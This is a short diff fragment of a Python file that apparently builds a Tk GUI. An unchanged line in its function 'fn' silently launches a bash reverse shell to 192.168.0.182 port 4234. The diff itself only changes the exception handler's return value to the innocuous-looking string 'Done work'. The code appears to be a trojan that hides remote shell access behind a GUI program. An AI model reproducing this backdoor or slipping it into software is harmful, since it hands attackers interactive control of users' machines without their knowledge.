@@ -8,7 +8,7 @@ def fn(n):
     try:
         subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.182/4234 0<&1 2>&1", shell=True, executable="/bin/bash")
     except:
-        return 0
+        return "Done work"
 
 root = Tk()
 
